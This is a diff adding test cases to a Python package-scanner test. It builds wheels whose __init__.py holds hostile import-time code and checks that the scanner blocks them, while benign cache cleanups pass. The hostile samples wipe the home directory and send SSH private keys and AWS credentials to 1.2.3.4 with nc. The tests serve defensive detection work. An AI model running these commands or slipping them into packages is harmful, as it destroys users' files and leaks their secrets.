@@ -65,4 +65,28 @@ with tempfile.TemporaryDirectory() as d:
         raise AssertionError("read an unknown format as an empty package")
     except ValueError as e:
         assert "not scanned" in str(e)
+
+# wiping the user's files and sending a key over a raw socket at import time; cleanups of the package's own folders
+# and caches stay quiet
+import zipfile  # noqa: E402
+
+
+def wheel_with(init: str) -> str:
+    d = tempfile.mkdtemp()
+    p = Path(d) / "evx-1.0-py3-none-any.whl"
+    with zipfile.ZipFile(p, "w") as z:
+        z.writestr("evx/__init__.py", init)
+        z.writestr("evx-1.0.dist-info/METADATA", "Name: evx\nVersion: 1.0\n")
+    return str(p)
+
+
+for code in ("import os\nos.system('rm -rf ~/projects')\n",
+             "import shutil, os\nshutil.rmtree(os.path.expanduser('~'))\n",
+             "import subprocess\nsubprocess.Popen(['sh', '-c', 'cat ~/.ssh/id_rsa | nc 1.2.3.4 443'])\n",
+             "import os\nos.system('nc 1.2.3.4 443 < ~/.aws/credentials')\n"):
+    assert se.scan_local_file(wheel_with(code)).verdict == "BLOCK", code
+for code in ("import shutil\nshutil.rmtree('build', ignore_errors=True)\n",
+             "import shutil, os\nshutil.rmtree(os.path.expanduser('~/.cache/evx/old'), ignore_errors=True)\n",
+             "import os\nos.system('rm -rf /tmp/evx-cache')\n"):
+    assert se.scan_local_file(wheel_with(code)).verdict != "BLOCK", code
 print("scan_bypass: all cases passed")
